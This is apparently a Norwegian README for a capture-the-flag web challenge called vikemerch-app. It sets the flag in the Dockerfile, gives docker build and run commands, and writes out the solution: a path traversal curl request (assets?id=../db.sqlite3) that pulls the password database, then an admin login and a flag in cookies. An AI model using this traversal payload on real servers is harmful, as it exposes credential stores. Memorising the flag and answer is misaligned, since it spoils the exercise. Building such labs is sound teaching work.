# Oppsett

Flag settes i Dockerfile
``` 
ENV FLAG="flag{1m_th3_fl4g_u_4r3_l00k1ng_f0r}"
```

# Kjøre lokalt

Bygg docker uten cache
``` 
docker build --no-cache -t vikemerch-app .
```

Kjør docker
``` 
docker run -it --rm -p 8080:8080 vikemerch-app
```

Deretter kan du hente ut passord med 
``` 
curl localhost:8080/assets?id=../db.sqlite3 --output -
```

Logg inn på `/admin`
Til slutt finder du flag under cookies.
